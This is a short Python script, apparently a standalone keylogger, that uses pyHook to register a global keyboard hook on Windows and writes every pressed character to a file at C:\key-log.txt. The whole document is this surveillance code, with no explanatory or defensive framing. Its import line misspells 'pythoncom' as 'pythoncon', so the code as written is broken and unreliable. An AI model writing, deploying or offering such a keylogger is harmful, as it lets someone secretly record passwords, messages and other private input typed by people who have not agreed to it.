import pyHook, pythoncon, sys, logging

file_log = 'C:\\key-log.txt'

def OnKeyboardInput(input):
	logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
	chr(input.Ascii)
	logging.log(10,chr(input.Ascii))
	return True
	
hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardInput
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()